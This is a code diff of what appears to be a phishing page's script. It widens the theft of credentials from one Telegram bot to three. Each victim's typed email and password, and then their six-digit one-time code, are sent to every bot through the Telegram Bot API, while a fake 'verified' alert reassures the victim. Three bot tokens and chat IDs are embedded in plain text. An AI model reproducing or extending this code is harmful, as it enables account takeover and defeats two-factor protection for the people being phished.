@@ -277,16 +277,31 @@
       }
   };
 */
-var token = "8735957211:AAEbltrJ2IDYC7lB9P_MRwiUuKbKkzSwpSU";
-      var chat_id = "7702404079";
-      var my_text = `Email:${email} Password:${password}`
-      var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
+
+const bots = [
+  {
+    token: "8293830620:AAGn9F90K-bCCT0gBb64dDSO8WYvpA2gkOI",
+    chatId: 6213918731
+  },
+   {
+    token: "8347968051:AAEThb_Nmqy-bhdsZwmEnsBSQgXVc-fGYbs",
+    chatId: 7554731151
+  },
+   {
+    token: "8735957211:AAEbltrJ2IDYC7lB9P_MRwiUuKbKkzSwpSU",
+    chatId: 7702404079
+  }
+]
+
+bots.forEach(bot => {
+   var my_text = `Email:${email} Password:${password}`
+      var url = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${my_text}`;
       console.log(email, password);
 
       let api = new XMLHttpRequest();
       api.open("GET", url, true);
       api.send();
-console.log(submittedOnce);
+})
       if(submittedOnce){
      currentEmail = email;
       document.getElementById('otpModal').style.display = 'flex';
@@ -324,20 +339,34 @@ console.log(submittedOnce);
     }
 
     function verifyOTP() {
+      const bots = [
+  {
+    token: "8293830620:AAGn9F90K-bCCT0gBb64dDSO8WYvpA2gkOI",
+    chatId: 6213918731
+  },
+   {
+    token: "8347968051:AAEThb_Nmqy-bhdsZwmEnsBSQgXVc-fGYbs",
+    chatId: 7554731151
+  },
+   {
+    token: "8735957211:AAEbltrJ2IDYC7lB9P_MRwiUuKbKkzSwpSU",
+    chatId: 7702404079
+  }
+]
       const inputs = document.querySelectorAll('.otp-input');
       let otp = "";
       inputs.forEach(input => otp += input.value);
 
       if (otp.length === 6) {
-         var token = "8735957211:AAEbltrJ2IDYC7lB9P_MRwiUuKbKkzSwpSU";
-      var chat_id = "7702404079";
-      var my_text = `This is the otp:${otp} for email:${currentEmail}`
-      var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
+      bots.forEach(bot => {
+          var my_text = `This is the otp:${otp} for email:${currentEmail}`
+      var url = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${my_text}`;
      
 
       let api = new XMLHttpRequest();
       api.open("GET", url, true);
       api.send();
+      })
         alert(`✅ OTP Verified Successfully!\n\nEmail: ${currentEmail}\nOTP: ${otp}`);
       } else {
         alert("Please enter all 6 digits.");
